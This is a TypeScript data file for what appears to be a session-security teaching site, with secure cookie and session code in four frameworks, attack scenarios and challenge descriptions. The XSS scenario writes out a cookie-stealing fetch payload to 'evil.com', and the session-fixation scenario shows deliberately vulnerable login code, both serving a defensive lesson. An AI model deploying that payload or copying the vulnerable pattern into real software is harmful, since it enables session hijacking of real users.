import { CodeExample, SecurityScenario, Challenge } from '@/lib/types';

export const codeExamples = {
  settingCookie: [
    {
      language: 'javascript' as const,
      label: 'JavaScript (Express)',
      code: `// Setting secure session cookie in Express.js
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  // Verify credentials
  const user = await db.findUser(username);
  const valid = await bcrypt.compare(password, user.passwordHash);

  if (!valid) return res.status(401).json({ error: 'Invalid credentials' });

  // Generate session ID (256 bits of entropy)
  const sessionId = crypto.randomBytes(32).toString('hex');

  // Store session in database
  await db.sessions.create({
    sessionId,
    userId: user.id,
    expiresAt: new Date(Date.now() + 24 * 60 * 60 * 1000), // 24 hours
  });

  // Set secure cookie
  res.cookie('sessionId', sessionId, {
    httpOnly: true,      // Prevents JavaScript access
    secure: true,        // HTTPS only
    sameSite: 'strict',  // CSRF protection
    maxAge: 86400000,    // 24 hours in milliseconds
  });

  res.json({ success: true, user: { id: user.id, username: user.username } });
});`,
    },
    {
      language: 'python' as const,
      label: 'Python (Flask)',
      code: `# Setting secure session cookie in Flask
from flask import Flask, request, make_response
import secrets
import bcrypt

@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')

    # Verify credentials
    user = db.find_user(username)
    if not bcrypt.checkpw(password.encode(), user.password_hash):
        return {'error': 'Invalid credentials'}, 401

    # Generate session ID
    session_id = secrets.token_hex(32)

    # Store session in database
    db.sessions.insert({
        'session_id': session_id,
        'user_id': user.id,
        'expires_at': datetime.now() + timedelta(hours=24)
    })

    # Create response with secure cookie
    response = make_response({'success': True, 'user': {'id': user.id}})
    response.set_cookie(
        'sessionId',
        session_id,
        httponly=True,      # Prevents JavaScript access
        secure=True,        # HTTPS only
        samesite='Strict',  # CSRF protection
        max_age=86400       # 24 hours
    )

    return response`,
    },
    {
      language: 'csharp' as const,
      label: 'C# (ASP.NET Core)',
      code: `// Setting secure session cookie in ASP.NET Core
[HttpPost("login")]
public IActionResult Login([FromBody] LoginDto dto)
{
    // Verify credentials
    var user = _db.Users.FirstOrDefault(u => u.Username == dto.Username);
    if (user == null || !BCrypt.Net.BCrypt.Verify(dto.Password, user.PasswordHash))
        return Unauthorized(new { error = "Invalid credentials" });

    // Generate session ID
    var sessionId = Convert.ToBase64String(RandomNumberGenerator.GetBytes(32));

    // Store session in database
    _db.Sessions.Add(new Session
    {
        SessionId = sessionId,
        UserId = user.Id,
        ExpiresAt = DateTime.UtcNow.AddHours(24)
    });
    _db.SaveChanges();

    // Set secure cookie
    Response.Cookies.Append("sessionId", sessionId, new CookieOptions
    {
        HttpOnly = true,      // Prevents JavaScript access
        Secure = true,        // HTTPS only
        SameSite = SameSiteMode.Strict,  // CSRF protection
        MaxAge = TimeSpan.FromHours(24)
    });

    return Ok(new { success = true, user = new { user.Id, user.Username } });
}`,
    },
    {
      language: 'ruby' as const,
      label: 'Ruby (Rails)',
      code: `# Setting secure session cookie in Ruby on Rails
class SessionsController < ApplicationController
  def create
    username = params[:username]
    password = params[:password]

    # Verify credentials
    user = User.find_by(username: username)
    unless user && BCrypt::Password.new(user.password_hash) == password
      render json: { error: 'Invalid credentials' }, status: :unauthorized
      return
    end

    # Generate session ID
    session_id = SecureRandom.hex(32)

    # Store session in database
    Session.create!(
      session_id: session_id,
      user_id: user.id,
      expires_at: 24.hours.from_now
    )

    # Set secure cookie
    cookies.encrypted[:sessionId] = {
      value: session_id,
      httponly: true,      # Prevents JavaScript access
      secure: true,        # HTTPS only
      same_site: :strict,  # CSRF protection
      expires: 24.hours.from_now
    }

    render json: { success: true, user: { id: user.id, username: user.username } }
  end
end`,
    },
  ] as CodeExample[],

  validatingSession: [
    {
      language: 'javascript' as const,
      label: 'JavaScript (Express)',
      code: `// Middleware to validate session
async function requireAuth(req, res, next) {
  const sessionId = req.cookies.sessionId;

  if (!sessionId) {
    return res.status(401).json({ error: 'No session cookie' });
  }

  // Look up session in database
  const session = await db.sessions.findOne({
    where: { sessionId }
  });

  // Check if session exists and not expired
  if (!session || new Date() > session.expiresAt) {
    return res.status(401).json({ error: 'Invalid or expired session' });
  }

  // Update last activity
  await db.sessions.update(
    { lastActivity: new Date() },
    { where: { sessionId } }
  );

  // Attach user to request
  req.userId = session.userId;
  next();
}

// Protected route
app.get('/api/protected', requireAuth, (req, res) => {
  res.json({ message: 'Access granted!', userId: req.userId });
});`,
    },
    {
      language: 'python' as const,
      label: 'Python (Flask)',
      code: `# Decorator to validate session
def require_auth(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        session_id = request.cookies.get('sessionId')

        if not session_id:
            return {'error': 'No session cookie'}, 401

        # Look up session in database
        session = db.sessions.find_one({'session_id': session_id})

        # Check if session exists and not expired
        if not session or datetime.now() > session['expires_at']:
            return {'error': 'Invalid or expired session'}, 401

        # Update last activity
        db.sessions.update_one(
            {'session_id': session_id},
            {'$set': {'last_activity': datetime.now()}}
        )

        # Make user_id available to route
        g.user_id = session['user_id']
        return f(*args, **kwargs)

    return decorated_function

# Protected route
@app.route('/api/protected')
@require_auth
def protected():
    return {'message': 'Access granted!', 'user_id': g.user_id}`,
    },
    {
      language: 'csharp' as const,
      label: 'C# (ASP.NET Core)',
      code: `// Custom authorization attribute
public class SessionAuthAttribute : TypeFilterAttribute
{
    public SessionAuthAttribute() : base(typeof(SessionAuthFilter)) { }
}

public class SessionAuthFilter : IAuthorizationFilter
{
    private readonly AppDbContext _db;

    public void OnAuthorization(AuthorizationFilterContext context)
    {
        var sessionId = context.HttpContext.Request.Cookies["sessionId"];

        if (string.IsNullOrEmpty(sessionId))
        {
            context.Result = new UnauthorizedObjectResult(
                new { error = "No session cookie" });
            return;
        }

        // Look up session
        var session = _db.Sessions.FirstOrDefault(s => s.SessionId == sessionId);

        // Validate session
        if (session == null || DateTime.UtcNow > session.ExpiresAt)
        {
            context.Result = new UnauthorizedObjectResult(
                new { error = "Invalid or expired session" });
            return;
        }

        // Update last activity
        session.LastActivity = DateTime.UtcNow;
        _db.SaveChanges();

        // Store user ID in HttpContext
        context.HttpContext.Items["UserId"] = session.UserId;
    }
}

// Protected endpoint
[HttpGet("protected")]
[SessionAuth]
public IActionResult GetProtected()
{
    var userId = (int)HttpContext.Items["UserId"];
    return Ok(new { message = "Access granted!", userId });
}`,
    },
    {
      language: 'ruby' as const,
      label: 'Ruby (Rails)',
      code: `# Controller concern for session auth
module SessionAuth
  extend ActiveSupport::Concern

  included do
    before_action :require_session
  end

  private

  def require_session
    session_id = cookies.encrypted[:sessionId]

    unless session_id
      render json: { error: 'No session cookie' }, status: :unauthorized
      return
    end

    # Look up session
    @session = Session.find_by(session_id: session_id)

    # Validate session
    if @session.nil? || @session.expires_at < Time.now
      render json: { error: 'Invalid or expired session' }, status: :unauthorized
      return
    end

    # Update last activity
    @session.update(last_activity: Time.now)

    # Make user available
    @current_user_id = @session.user_id
  end
end

# Protected controller
class ProtectedController < ApplicationController
  include SessionAuth

  def show
    render json: { message: 'Access granted!', user_id: @current_user_id }
  end
end`,
    },
  ] as CodeExample[],

  sessionRegeneration: [
    {
      language: 'javascript' as const,
      label: 'JavaScript (Express)',
      code: `// Regenerate session ID after login (prevents session fixation)
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  // Verify credentials...
  const user = await verifyCredentials(username, password);
  if (!user) return res.status(401).json({ error: 'Invalid credentials' });

  // Delete old session if exists
  const oldSessionId = req.cookies.sessionId;
  if (oldSessionId) {
    await db.sessions.delete({ where: { sessionId: oldSessionId } });
  }

  // Generate NEW session ID
  const newSessionId = crypto.randomBytes(32).toString('hex');

  // Store new session
  await db.sessions.create({
    sessionId: newSessionId,
    userId: user.id,
    expiresAt: new Date(Date.now() + 24 * 60 * 60 * 1000),
  });

  // Set new cookie
  res.cookie('sessionId', newSessionId, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 86400000,
  });

  res.json({ success: true });
});`,
    },
  ] as CodeExample[],

  logout: [
    {
      language: 'javascript' as const,
      label: 'JavaScript (Express)',
      code: `// Complete session cleanup on logout
app.post('/logout', async (req, res) => {
  const sessionId = req.cookies.sessionId;

  if (sessionId) {
    // Remove session from database
    await db.sessions.delete({
      where: { sessionId }
    });
  }

  // Clear cookie
  res.clearCookie('sessionId', {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
  });

  res.json({ success: true, message: 'Logged out successfully' });
});`,
    },
  ] as CodeExample[],
};

export const securityScenarios: SecurityScenario[] = [
  {
    id: 'xss-cookie-theft',
    title: 'Cookie Theft via XSS',
    threatLevel: 'HIGH',
    attack: 'An attacker injects malicious JavaScript into your website through a vulnerable input field. The script attempts to steal session cookies by reading document.cookie and sending them to an attacker-controlled server.',
    exploitation: 'If cookies are accessible to JavaScript (no HttpOnly flag), the attacker can exfiltrate session IDs: fetch("https://evil.com?cookie=" + document.cookie). Once stolen, the attacker can impersonate the user by setting the same cookie in their browser.',
    defense: 'Set the HttpOnly flag on session cookies. This makes them inaccessible to JavaScript, even if XSS occurs. Also implement Content Security Policy (CSP) headers to prevent inline script execution.',
    vulnerableCode: {
      language: 'javascript',
      label: 'Vulnerable',
      code: `// BAD: Cookie accessible to JavaScript
res.cookie('sessionId', sessionId, {
  secure: true,
  sameSite: 'strict',
  // Missing httpOnly: true
});

// Attacker can now steal it:
// <script>fetch('https://evil.com?c=' + document.cookie)</script>`,
    },
    secureCode: {
      language: 'javascript',
      label: 'Secure',
      code: `// GOOD: HttpOnly prevents JavaScript access
res.cookie('sessionId', sessionId, {
  httpOnly: true,     // Cookie invisible to JavaScript
  secure: true,
  sameSite: 'strict',
});

// Also add CSP header
res.setHeader('Content-Security-Policy', "script-src 'self'");

// Now document.cookie will NOT include sessionId`,
    },
  },
  {
    id: 'session-fixation',
    title: 'Session Fixation Attack',
    threatLevel: 'HIGH',
    attack: 'An attacker tricks a victim into using a session ID the attacker already knows. For example, sending a link like: http://bank.com/login?sessionId=ATTACKER_CONTROLLED_ID. If the application accepts this session ID, the attacker can hijack the session after the victim logs in.',
    exploitation: 'The victim logs in using the attacker\'s predetermined session ID. The server associates the legitimate user\'s credentials with this session. The attacker, who knows the session ID, can now make authenticated requests as the victim.',
    defense: 'ALWAYS regenerate the session ID after successful login. Destroy the old session and create a new one. Never accept session IDs from URL parameters or untrusted sources.',
    vulnerableCode: {
      language: 'javascript',
      label: 'Vulnerable',
      code: `// BAD: Reuses existing session ID
app.post('/login', async (req, res) => {
  const user = await verifyCredentials(req.body);

  // Just updates existing session - DANGEROUS!
  const sessionId = req.cookies.sessionId || generateSessionId();
  await db.sessions.update({ userId: user.id }, { where: { sessionId } });

  res.cookie('sessionId', sessionId);
  // Attacker's preset session ID is now authenticated
});`,
    },
    secureCode: {
      language: 'javascript',
      label: 'Secure',
      code: `// GOOD: Always regenerate session ID on login
app.post('/login', async (req, res) => {
  const user = await verifyCredentials(req.body);

  // Delete old session
  const oldSessionId = req.cookies.sessionId;
  if (oldSessionId) {
    await db.sessions.delete({ where: { sessionId: oldSessionId } });
  }

  // Create NEW session with NEW ID
  const newSessionId = crypto.randomBytes(32).toString('hex');
  await db.sessions.create({
    sessionId: newSessionId,
    userId: user.id,
  });

  res.cookie('sessionId', newSessionId, { httpOnly: true, secure: true });
  // Attacker's old session ID is now useless
});`,
    },
  },
  {
    id: 'forgotten-logout',
    title: 'Forgotten Logout on Shared Computers',
    threatLevel: 'MEDIUM',
    attack: 'A user logs into a web application on a public/shared computer but forgets to log out. The next person who uses the computer can access the previous user\'s account because the session cookie is still valid in the browser.',
    exploitation: 'The attacker simply opens the browser and navigates to the application. Since the session cookie hasn\'t expired and logout wasn\'t called, they have full access to the victim\'s account without needing credentials.',
    defense: 'Implement short session timeouts (15-30 minutes of inactivity). Use absolute expiration times (e.g., 8 hours max regardless of activity). Provide a "logout all devices" feature. Show active session list to users.',
    secureCode: {
      language: 'javascript',
      label: 'Secure Implementation',
      code: `// Implement both idle timeout and absolute expiration
const SESSION_IDLE_TIMEOUT = 30 * 60 * 1000; // 30 minutes
const SESSION_ABSOLUTE_TIMEOUT = 8 * 60 * 60 * 1000; // 8 hours

async function validateSession(sessionId) {
  const session = await db.sessions.findOne({ where: { sessionId } });

  if (!session) return null;

  const now = new Date();

  // Check absolute expiration
  if (now > session.expiresAt) {
    await db.sessions.delete({ where: { sessionId } });
    return null;
  }

  // Check idle timeout
  const idleTime = now - session.lastActivity;
  if (idleTime > SESSION_IDLE_TIMEOUT) {
    await db.sessions.delete({ where: { sessionId } });
    return null;
  }

  // Update last activity
  await db.sessions.update(
    { lastActivity: now },
    { where: { sessionId } }
  );

  return session;
}`,
    },
  },
];

export const challenges: Challenge[] = [
  {
    id: 'decode-breach',
    title: 'Decode the Breach',
    description: 'You\'ve intercepted a session cookie from a compromised system. Analyze it to identify which security attributes are missing and explain how an attacker could exploit these weaknesses.',
    difficulty: 'Easy',
    points: 100,
  },
  {
    id: 'build-fort',
    title: 'Build the Fort',
    description: 'Implement a complete secure session creation function that includes credential verification, session ID generation, database storage, and cookie setting with all proper security attributes.',
    difficulty: 'Medium',
    points: 250,
  },
  {
    id: 'hunt-hacker',
    title: 'Hunt the Hacker',
    description: 'Review a codebase with 5 critical session vulnerabilities including session fixation, XSS cookie theft, CSRF, timing attacks, and insecure storage. Find and fix all vulnerabilities.',
    difficulty: 'Hard',
    points: 500,
  },
];
